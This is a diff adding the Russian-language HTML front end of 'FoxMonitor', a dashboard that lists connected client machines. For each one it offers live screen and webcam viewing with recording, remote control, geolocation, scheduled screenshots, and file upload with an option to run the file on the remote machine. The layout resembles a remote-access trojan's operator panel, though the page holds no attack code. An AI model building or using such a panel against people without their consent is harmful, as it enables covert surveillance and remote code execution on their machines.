@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FoxMonitor</title>
+<link rel="icon" href="data:,">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div id="view-login" class="view">
+  <div class="login-card">
+    <div class="logo-badge"><span class="logo-dot"></span>FoxMonitor</div>
+    <h1>Вход в панель мониторинга</h1>
+    <form id="login-form">
+      <input type="text" id="login-user" placeholder="Логин" autocomplete="username" required>
+      <input type="password" id="login-pass" placeholder="Пароль" autocomplete="current-password" required>
+      <button type="submit" class="btn btn-primary btn-block">Войти</button>
+      <div id="login-error" class="login-error"></div>
+    </form>
+  </div>
+</div>
+
+<div id="view-dash" class="view hidden">
+
+  <header class="topbar">
+    <div class="brand"><span class="logo-dot"></span>FoxMonitor</div>
+    <div class="topbar-right">
+      <span id="conn-badge" class="badge badge-off">нет связи с сервером</span>
+      <button id="btn-logs" class="btn btn-ghost">Логи</button>
+      <button id="btn-files" class="btn btn-ghost">Файлы</button>
+      <button id="btn-scheduler" class="btn btn-ghost">Планировщик</button>
+      <span id="user-label" class="user-label"></span>
+      <button id="btn-logout" class="btn btn-ghost">Выйти</button>
+    </div>
+  </header>
+
+  <main class="content">
+    <div class="section-head">
+      <h2>Клиенты <span id="client-count" class="count-pill">0</span></h2>
+      <button id="btn-refresh" class="btn btn-ghost">Обновить</button>
+    </div>
+    <div id="clients-grid" class="clients-grid"></div>
+    <div id="empty-state" class="empty-state hidden">
+      <div class="empty-icon">&#128225;</div>
+      <p>Нет подключённых клиентов.<br>Запусти клиент на машине и он появится здесь.</p>
+    </div>
+  </main>
+
+  <footer class="footer">FoxMonitor · прототип для локального тестирования</footer>
+</div>
+
+<!-- ======================= Modal: просмотр стрима ======================= -->
+<div id="modal" class="modal hidden">
+  <div class="modal-box" id="modal-box" tabindex="0">
+    <div class="modal-head">
+      <div>
+        <div class="modal-title">Просмотр: <span id="modal-cid"></span></div>
+        <div class="modal-sub"><span id="modal-ip"></span> · <span id="modal-fps"></span></div>
+      </div>
+      <button id="modal-close" class="btn btn-ghost">&times;</button>
+    </div>
+
+    <div class="tabs">
+      <button class="tab active" data-tab="info">Инфо</button>
+      <button class="tab" data-tab="screen">Экран</button>
+      <button class="tab" data-tab="camera">Камера</button>
+      <button class="tab" data-tab="files">Файлы</button>
+      <button class="tab" data-tab="misc">Прочее</button>
+    </div>
+
+    <div id="info-view" class="info-view hidden">
+      <div class="info-grid">
+        <div class="info-block">
+          <div class="info-title">Компьютер</div>
+          <div id="info-pc" class="info-body"><div class="info-empty">нет данных</div></div>
+        </div>
+        <div class="info-block">
+          <div class="info-title">Мониторы <span id="info-mon-count" class="count-pill hidden"></span></div>
+          <div id="info-monitors" class="info-body"><div class="info-empty">нет данных</div></div>
+        </div>
+        <div class="info-block">
+          <div class="info-title">Местоположение</div>
+          <div id="info-location" class="info-body"><div class="info-empty">нет данных</div></div>
+        </div>
+      </div>
+    </div>
+
+    <div id="fm-view" class="fm-view hidden">
+      <div class="fm-toolbar">
+        <button id="fm-up" class="btn btn-ghost" title="На уровень выше">&#11014;</button>
+        <button id="fm-refresh" class="btn btn-ghost" title="Обновить">&#8635;</button>
+        <input id="fm-path" class="fm-path" placeholder="Путь (Enter — перейти)">
+        <label class="fm-run-chk" title="Запустить файл на машине после загрузки">
+          <input type="checkbox" id="fm-run"> запустить после загрузки
+        </label>
+        <label class="btn btn-primary fm-upload" title="Загрузить файл на машину">
+          &#8682; Загрузить<input type="file" id="fm-file" hidden>
+        </label>
+      </div>
+      <div class="fm-list" id="fm-list"><div class="info-empty">загрузка…</div></div>
+    </div>
+
+    <div id="misc-view" class="misc-view hidden">
+      <div class="misc-grid" id="misc-grid"></div>
+    </div>
+
+    <div class="video-wrap">
+      <div class="video-slot" id="video-screen">
+        <img id="frame-screen" alt="screen">
+        <div class="rec-badge hidden" id="rec-badge-screen">&#9679; REC</div>
+        <div class="no-signal hidden" id="nosig-screen">нет сигнала</div>
+      </div>
+      <div class="video-slot hidden" id="video-camera">
+        <img id="frame-camera" alt="camera">
+        <div class="rec-badge hidden" id="rec-badge-camera">&#9679; REC</div>
+        <div class="no-signal hidden" id="nosig-camera">нет сигнала</div>
+      </div>
+    </div>
+
+    <div class="modal-controls" id="modal-controls">
+      <button id="btn-control" class="btn btn-ghost btn-control">&#9783; Управление</button>
+      <button id="btn-record" class="btn btn-danger">&#9679; Запись</button>
+      <button id="btn-shot" class="btn btn-primary">&#128247; Скриншот</button>
+      <button id="btn-dl-frame" class="btn btn-ghost">&#8681; Сохранить кадр</button>
+
+      <div class="ctl-group">
+        <label>Качество <span id="q-val">75</span></label>
+        <input type="range" id="ctl-quality" min="10" max="100" value="75">
+      </div>
+
+      <div class="ctl-group">
+        <label>FPS <span id="fps-val">10</span></label>
+        <input type="range" id="ctl-fps" min="1" max="30" value="10">
+      </div>
+
+      <div class="ctl-group">
+        <label>Стрим</label>
+        <div class="btn-row">
+          <button id="btn-stop-stream" class="btn btn-ghost">Стоп</button>
+          <button id="btn-start-stream" class="btn btn-ghost">Старт</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======================= Panel: планировщик ======================= -->
+<div id="panel-scheduler" class="panel hidden">
+  <div class="panel-head">
+    <h3>Планировщик скриншотов</h3>
+    <button class="btn btn-ghost panel-close" data-panel="scheduler">&times;</button>
+  </div>
+  <div class="panel-body">
+    <label class="switch-row">
+      <input type="checkbox" id="sched-enabled">
+      <span>Автоматические скриншоты</span>
+    </label>
+    <label>Интервал, минут
+      <input type="number" id="sched-interval" min="1" max="1440" value="5">
+    </label>
+    <button id="btn-sched-save" class="btn btn-primary btn-block">Сохранить</button>
+    <div class="hint">Сервер будет запрашивать скриншот экрана у каждого активного клиента с заданной периодичностью. Файлы сохраняются в data/screenshots.</div>
+  </div>
+</div>
+
+<!-- ======================= Panel: файлы ======================= -->
+<div id="panel-files" class="panel hidden">
+  <div class="panel-head">
+    <h3>Записи и скриншоты</h3>
+    <button class="btn btn-ghost panel-close" data-panel="files">&times;</button>
+  </div>
+  <div class="panel-body">
+    <div class="subhead">Записи (MJPEG)</div>
+    <div id="rec-list" class="file-list"></div>
+    <div class="subhead">Скриншоты</div>
+    <div id="shot-list" class="file-list"></div>
+    <div class="hint">Записи сохраняются как поток JPEG (.mjpeg). Конвертация в MP4: ffmpeg -i file.mjpeg -c:v libx264 out.mp4</div>
+  </div>
+</div>
+
+<!-- ======================= Panel: логи ======================= -->
+<div id="panel-logs" class="panel hidden">
+  <div class="panel-head">
+    <h3>Журнал сервера</h3>
+    <button class="btn btn-ghost panel-close" data-panel="logs">&times;</button>
+  </div>
+  <div class="panel-body">
+    <pre id="log-view" class="log-view"></pre>
+  </div>
+</div>
+
+<div id="toasts" class="toasts"></div>
+
+<script src="app.js"></script>
+</body>
+</html>
